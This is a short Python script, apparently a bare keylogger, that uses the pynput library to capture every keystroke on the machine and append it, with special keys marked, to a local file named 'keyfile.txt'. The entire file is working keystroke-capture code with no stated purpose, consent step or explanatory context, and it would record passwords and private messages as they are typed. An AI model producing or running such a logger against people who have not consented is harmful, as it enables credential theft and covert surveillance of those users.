from pynput import keyboard

def keyPressed(key):
    with open("keyfile.txt", "a") as logkey:
        try:
            logkey.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                logkey.write(" ")
            elif key == keyboard.Key.enter:
                logkey.write("\n")
            else:
                logkey.write(f"[{key}]")

if __name__ == "__main__": 
    listener = keyboard.Listener(on_press=keyPressed) 
    listener.start()
    listener.join()
